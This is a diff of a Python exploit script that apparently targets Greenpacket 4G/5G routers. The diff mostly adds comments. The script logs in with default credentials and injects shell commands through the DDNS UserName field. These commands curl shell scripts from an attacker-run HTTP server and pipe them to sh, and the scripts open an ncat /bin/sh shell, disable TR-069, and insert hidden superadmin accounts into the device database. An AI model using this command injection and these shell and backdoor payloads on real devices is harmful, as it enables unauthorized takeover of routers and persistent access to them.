@@ -3,12 +3,12 @@ import http.server
 import socketserver
 
 # Local settings for http payload server
-settings_localip = "192.168.88.102"
+settings_localip = "192.168.0.100"
 settings_localport = 18080
 # Greenpacket settings
-settings_remote_ip = "192.168.101.1"
+settings_remote_ip = "192.168.0.1"
 settings_user = "superadmin"
-settings_password = "Gr33nPacket!"
+settings_password = "admin"
 
 class httpd:
     def __init__(self, host='localhost', port=8000, directory='.'):
@@ -94,7 +94,7 @@ payloadserver = httpd(host=settings_localip,port=settings_localport,directory='.
 
 if(session[0]):
     session_token = session[1]
-    # Start serving shell scripts
+    # Start serving shell scripts, folder contains working templates they get rewriten on the fly.
     payloadserver.start()
     picker = ''
     # Templates for command injection
@@ -123,7 +123,7 @@ if(session[0]):
                 print("Launching Ncat shell...")
                 payload = ddns_cmd_inject
                 payload["UserName"] = f";timeout 5 curl http://{settings_localip}:{settings_localport}/ncat.sh | sh;"
-                # Generate payload on the fly to fill LAN ip correctly
+                # Generate payload on the fly to fill LAN ip correctly, default firewall is crap and lets both IPv4/6 access SSH that is on by default....
                 payload_sh = open('payloads/ncat.sh', 'w')
                 payload_sh.write(f'nohup nc -ll -p 6969 {settings_remote_ip} -e /bin/sh >/dev/null 2>&1 &\n')
                 payload_sh.close()
@@ -140,7 +140,7 @@ if(session[0]):
                 print("Starting TR-069 removal...")
                 payload = ddns_cmd_inject
                 payload["UserName"] = f";timeout 5 curl http://{settings_localip}:{settings_localport}/tr069.sh | sh;"
-
+                # Hopefully this accualy saves systemctl too, H5 doesn't have a typical overlayfs setup
                 result1 = session_post(session_token, 'web/v1/setting/system/ddns', payload)
                 if(result1[0]):
                     print(f"TR-069 service has been stopped, disabled and defused. No more ISP spying.")
@@ -150,12 +150,13 @@ if(session[0]):
                    print("Settings cleanup ok")
                 input("Done!")
             case '4':
-                print("Adding new superadmin account...")
+                print("Setting new superadmin account...")
                 payload = ddns_cmd_inject
                 payload["UserName"] = f";timeout 5 curl http://{settings_localip}:{settings_localport}/superadmin.sh | sh;"
 
                 userpassword = ''.join(random.choices("1234567890qwertzuiopASDFGHJKLyxcvbnm", k=16))
-
+                # Note that other devices like D5H don't have a superadmin account, more work needed
+                # Zain and Irancell firmwares only have admin user with extra settings for restricting user access from LAN/WAN
                 payload_sh = open('payloads/superadmin.sh', 'w')
                 payload_sh.write(f'\n')
                 payload_sh.write(f'passwdmd5=`echo -n {userpassword} |md5sum|cut -d" " -f1`\n')
@@ -181,7 +182,7 @@ if(session[0]):
                 payload_sh = open('payloads/adduser.sh', 'w')
                 payload_sh.write(f'\n')
                 payload_sh.write(f'passwdmd5=`echo -n {userpassword} |md5sum|cut -d" " -f1`\n')
-                payload_sh.write(f'sqlite3 /data/turin/web/datas/memohi.db "delete from users where id=\'69\'"\n')
+                payload_sh.write(f'sqlite3 /data/turin/web/datas/memohi.db "delete from users where id=\'69\'"\n') # Delete old user with this ID
                 payload_sh.write(f'sqlite3 /data/turin/web/datas/memohi.db "INSERT INTO users (\'id\', \'username\', \'password\', \'roletype\', \'firstlogin\') VALUES (69, \'{username}\', \'$passwdmd5\', \'admin\', false);"\n')
                 payload_sh.close()
 
@@ -196,6 +197,8 @@ if(session[0]):
             case '6':
                 print("Unlocking Command Shell...")
                 device_status = session_get(session_token, '/web/v1/setting/deviceinfo', '')
+                # Calls to cped service over ubus, unsure how usefull it is outside just reading statistics. Output buffer is quite small
+.               # If firmware has the shell menu hidden you can still send commands with requests :)
                 if( device_status[0] ):
                     device_imei = device_status[1]["IMEI"]
                     imei_b64 =  base64.b64encode(bytes(device_imei,"utf8")).decode("utf-8")
